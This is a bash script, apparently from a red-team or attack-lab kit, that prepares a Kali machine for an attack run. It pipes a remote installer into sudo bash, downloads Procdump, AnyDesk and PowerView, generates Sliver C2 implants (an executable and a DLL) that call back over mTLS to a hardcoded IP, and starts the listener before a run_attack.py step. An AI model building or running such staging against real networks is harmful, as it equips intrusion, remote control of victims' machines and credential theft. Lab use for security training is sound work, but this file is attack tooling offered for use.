#!/bin/bash
# =============================================================
# setup_payloads.sh - Run ONCE on Kali
# Installs tools, downloads payloads, generates Sliver implants
# =============================================================
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
TOOLS_DIR="$BASE_DIR/payloads/tools"
PS1_DIR="$BASE_DIR/payloads/ps1"
BAT_DIR="$BASE_DIR/payloads/bat"

KALI_IP="10.0.10.50"
SLIVER_PORT="443"
HTTP_PORT="8080"

log()  { echo -e "${CYAN}[*] $1${NC}"; }
ok()   { echo -e "${GREEN}[+] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }

mkdir -p "$TOOLS_DIR" "$PS1_DIR" "$BAT_DIR"

# 1. System packages
log "Installing packages..."
apt-get update -qq
apt-get install -y -qq wget curl unzip git smbclient python3-pip genisoimage
pip3 install -q impacket colorama --break-system-packages
ok "Packages done"

# 2. Sliver C2
log "Checking Sliver..."
if ! command -v sliver-server &>/dev/null; then
    curl -s https://sliver.sh/install | sudo bash
fi
if ! pgrep -x "sliver-server" > /dev/null; then
    sliver-server daemon &
    sleep 5
fi
ok "Sliver running"

# 3. Procdump
log "Downloading Procdump..."
if [ ! -f "$TOOLS_DIR/procdump64.exe" ]; then
    wget -q "https://download.sysinternals.com/files/Procdump.zip" -O "$TOOLS_DIR/Procdump.zip"
    unzip -q -o "$TOOLS_DIR/Procdump.zip" -d "$TOOLS_DIR/"
    rm "$TOOLS_DIR/Procdump.zip"
fi
ok "Procdump ready"

# 4. AnyDesk
log "Downloading AnyDesk..."
if [ ! -f "$TOOLS_DIR/AnyDesk.exe" ]; then
    wget -q "https://download.anydesk.com/AnyDesk.exe" \
        --user-agent "Mozilla/5.0" -O "$TOOLS_DIR/AnyDesk.exe" || \
        warn "AnyDesk failed - download manually from anydesk.com"
fi
[ -f "$TOOLS_DIR/AnyDesk.exe" ] && ok "AnyDesk ready" || warn "AnyDesk missing"

# 5. PowerSploit
log "Cloning PowerSploit..."
if [ ! -f "$PS1_DIR/PowerView.ps1" ]; then
    git clone -q https://github.com/PowerShellMafia/PowerSploit.git /tmp/PowerSploit 2>/dev/null || true
    cp /tmp/PowerSploit/Recon/PowerView.ps1 "$PS1_DIR/" 2>/dev/null || \
        warn "PowerView failed - download manually to payloads/ps1/PowerView.ps1"
fi
[ -f "$PS1_DIR/PowerView.ps1" ] && ok "PowerView ready" || warn "PowerView missing"

# 6. Sliver implants
log "Generating Sliver implants..."
if [ ! -f "$TOOLS_DIR/wab.exe" ]; then
    sliver-client generate \
        --mtls "${KALI_IP}:${SLIVER_PORT}" \
        --os windows --arch amd64 --format exe \
        --name wab --save "$TOOLS_DIR/wab.exe" \
        --skip-symbols 2>/dev/null && ok "wab.exe generated" || \
        warn "Run in Sliver console: generate --mtls ${KALI_IP}:${SLIVER_PORT} --os windows --arch amd64 --format exe --name wab"
fi

if [ ! -f "$TOOLS_DIR/namr.dll" ]; then
    sliver-client generate \
        --mtls "${KALI_IP}:${SLIVER_PORT}" \
        --os windows --arch amd64 --format shared \
        --name namr --save "$TOOLS_DIR/namr.dll" \
        --skip-symbols 2>/dev/null && ok "namr.dll generated" || \
        warn "Run in Sliver console: generate --mtls ${KALI_IP}:${SLIVER_PORT} --os windows --arch amd64 --format shared --name namr"
fi

sliver-client mtls --lport "${SLIVER_PORT}" 2>/dev/null && \
    ok "MTLS listener on :${SLIVER_PORT}" || warn "Listener may already be running"

# 7. Preflight
echo ""
log "Preflight check..."
for f in \
    "$TOOLS_DIR/wab.exe:Sliver beacon" \
    "$TOOLS_DIR/namr.dll:Sliver DLL" \
    "$TOOLS_DIR/procdump64.exe:Procdump64" \
    "$TOOLS_DIR/AnyDesk.exe:AnyDesk" \
    "$PS1_DIR/PowerView.ps1:PowerView"; do
    path="${f%%:*}"; label="${f##*:}"
    [ -f "$path" ] && ok "$label" || warn "MISSING: $label"
done

echo ""
ok "Setup complete!"
echo -e "  ${CYAN}ansible-playbook -i ansible/inventory.yml ansible/lab_prep.yml${NC}"
echo -e "  ${CYAN}python3 run_attack.py --fast${NC}"